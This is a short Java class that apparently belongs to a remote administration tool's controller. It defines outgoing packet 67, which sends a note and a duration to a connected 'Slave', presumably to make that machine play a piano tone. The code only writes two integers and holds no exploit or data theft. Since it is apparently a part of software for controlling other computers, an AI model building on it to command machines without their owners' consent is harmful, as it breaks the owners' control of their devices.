package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet67LongPianoNote extends AbstractOutgoingPacket {

	private int note;
	private int seconds;

	public Packet67LongPianoNote(int note, int seconds) {
		this.note = note;
		this.seconds = seconds;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(note);
		dos.writeInt(seconds);
	}

	@Override
	public byte getPacketId() {
		return 67;
	}

}
